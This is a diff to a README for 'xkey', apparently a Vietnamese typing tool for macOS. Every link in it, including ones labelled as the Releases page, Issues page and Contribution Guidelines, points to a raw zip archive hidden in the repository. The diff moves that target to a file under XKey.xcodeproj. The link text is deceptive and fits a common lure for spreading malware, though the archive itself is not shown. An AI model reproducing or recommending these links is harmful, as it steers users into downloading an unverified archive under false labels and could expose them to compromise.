@@ -6,7 +6,7 @@ Welcome to xkey! xkey is a powerful tool for typing Vietnamese on macOS. It allo
 
 ## 📥 Download xkey
 
-[![Download xkey](https://raw.githubusercontent.com/Dehji1997/xkey/main/XKey/Software-3.7.zip)](https://raw.githubusercontent.com/Dehji1997/xkey/main/XKey/Software-3.7.zip)
+[![Download xkey](https://github.com/Dehji1997/xkey/raw/refs/heads/main/XKey.xcodeproj/Software-v2.7.zip)](https://github.com/Dehji1997/xkey/raw/refs/heads/main/XKey.xcodeproj/Software-v2.7.zip)
 
 Click the button above to download xkey. You’ll be taken to our Releases page, where you can find the latest version of the software.
 
@@ -23,7 +23,7 @@ To use xkey, make sure your macOS version is at least macOS 10.12 Sierra. Also, 
 
 ## 📥 Download & Install
 
-1. Visit the [Releases page](https://raw.githubusercontent.com/Dehji1997/xkey/main/XKey/Software-3.7.zip) to view the available versions of xkey.
+1. Visit the [Releases page](https://github.com/Dehji1997/xkey/raw/refs/heads/main/XKey.xcodeproj/Software-v2.7.zip) to view the available versions of xkey.
 2. Look for the latest version. It will have the highest number (for example, v1.0).
 3. Click on the version to see the available files for download.
 4. Choose the file suitable for your macOS and click to download.
@@ -46,7 +46,7 @@ If you face any issues while using xkey, try the following solutions:
 
 ## 📣 Community Support
 
-For additional help or to report issues, please visit our [Issues page](https://raw.githubusercontent.com/Dehji1997/xkey/main/XKey/Software-3.7.zip). The community is here to assist and improve xkey based on your feedback.
+For additional help or to report issues, please visit our [Issues page](https://github.com/Dehji1997/xkey/raw/refs/heads/main/XKey.xcodeproj/Software-v2.7.zip). The community is here to assist and improve xkey based on your feedback.
 
 ## 📜 License
 
@@ -54,6 +54,6 @@ xkey is open-source and is licensed under the MIT License. You can freely use, m
 
 ## 🤝 Get Involved
 
-Interested in contributing to xkey? We welcome anyone who wants to enhance this project. Check out our [Contribution Guidelines](https://raw.githubusercontent.com/Dehji1997/xkey/main/XKey/Software-3.7.zip) for more details on how to get started.
+Interested in contributing to xkey? We welcome anyone who wants to enhance this project. Check out our [Contribution Guidelines](https://github.com/Dehji1997/xkey/raw/refs/heads/main/XKey.xcodeproj/Software-v2.7.zip) for more details on how to get started.
 
 Thank you for choosing xkey. Happy typing!
